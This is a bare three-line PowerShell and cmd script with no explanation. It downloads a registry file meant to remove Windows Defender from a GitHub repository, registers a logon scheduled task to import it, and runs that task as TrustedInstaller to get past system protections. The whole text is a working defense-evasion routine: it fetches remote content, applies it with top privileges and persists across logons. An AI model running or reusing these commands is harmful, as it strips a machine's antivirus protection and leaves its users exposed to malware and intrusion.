irm raw.githubusercontent.com/ionuttbara/windows-defender-remover/main/Remove_Defender/RemoveDefender.reg -o $Env:Temp\Defender.reg
schtasks /create /tn Defender /tr "reg import %TEMP%\Defender.reg" /sc onlogon
$o=New-Object -Com 'Schedule.Service';$o.Connect();$o.GetFolder('\').GetTask('Defender').RunEx($null,0,0,'NT SERVICE\TrustedInstaller')|Out-Null
